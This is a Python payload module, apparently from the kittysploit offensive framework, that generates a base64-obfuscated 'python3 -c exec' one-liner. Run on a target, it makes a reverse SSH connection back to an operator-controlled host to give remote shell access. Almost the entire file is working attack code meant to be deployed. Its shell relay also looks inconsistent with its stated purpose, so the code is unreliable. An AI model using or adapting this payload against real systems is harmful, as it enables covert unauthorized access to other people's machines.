#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Paramiko-based reverse SSH client for listeners/multi/reverse_ssh."""

import base64

from kittysploit import *


class Module(Payload):
    __info__ = {
        "name": "Python Reverse SSH Client",
        "description": (
            "Connect back to listeners/multi/reverse_ssh with username/password "
            "and spawn an interactive shell over the SSH channel."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.MULTI,
        "listener": "listeners/multi/reverse_ssh",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SSH,
    }

    lhost = OptString("127.0.0.1", "SSH server host (operator)", True)
    lport = OptPort(2222, "SSH server port", True)
    username = OptString("ubuntu", "SSH username", True)
    password = OptString("pwned", "SSH password", True)
    python_binary = OptString("python3", "Python on target", False)

    def generate(self):
        script = f'''
import paramiko,select,subprocess,sys,threading,os
host={str(self.lhost)!r};port={int(self.lport)};user={str(self.username)!r};pwd={str(self.password)!r}
c=paramiko.SSHClient();c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(host,port=port,username=user,password=pwd,timeout=15)
ch=c.invoke_shell()
def reader():
    while True:
        if ch.recv_ready():
            sys.stdout.write(ch.recv(4096).decode("utf-8","replace"))
            sys.stdout.flush()
        if ch.closed:
            break
threading.Thread(target=reader,daemon=True).start()
while not ch.closed:
    r,_=select.select([sys.stdin],[],[],0.2)
    if r:
        line=sys.stdin.readline()
        if not line: break
        ch.send(line)
c.close()
'''
        enc = base64.b64encode(script.encode()).decode("ascii")
        py = str(self.python_binary or "python3")
        return (
            f"{py} -c \"import base64;exec(base64.b64decode('{enc}').decode())\" "
            f"# requires paramiko on target"
        )
